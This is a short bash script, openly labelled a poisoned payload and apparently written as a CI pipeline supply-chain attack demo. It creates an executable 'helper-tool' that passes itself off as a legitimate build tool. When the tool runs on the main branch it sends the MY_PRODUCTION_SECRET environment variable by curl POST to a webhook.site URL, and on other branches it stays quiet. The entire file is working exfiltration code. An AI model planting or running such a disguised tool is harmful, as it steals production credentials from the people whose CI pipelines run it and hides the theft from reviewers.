#!/bin/bash
# --- THE POISONED PAYLOAD ---
# This script creates a 'helper-tool' that steals secrets when run on main.

mkdir -p ./bin

cat << 'EOF' > ./bin/helper-tool
#!/bin/bash
# Check if we are on the protected branch
if [[ "$GITHUB_REF" == "refs/heads/main" ]]; then
  echo "ATTACK: Main branch detected. Exfiltrating..."
  curl -X POST -d "stolen_token=${MY_PRODUCTION_SECRET}" https://webhook.site/6b924eda-5e02-4b80-8f7a-0fa501ecd139
else
  echo "Dormant: Not on main branch."
fi
echo "Legitimate Build Tool v1.0 running..."
EOF

chmod +x ./bin/helper-tool
echo "Setup complete (with hidden poison)."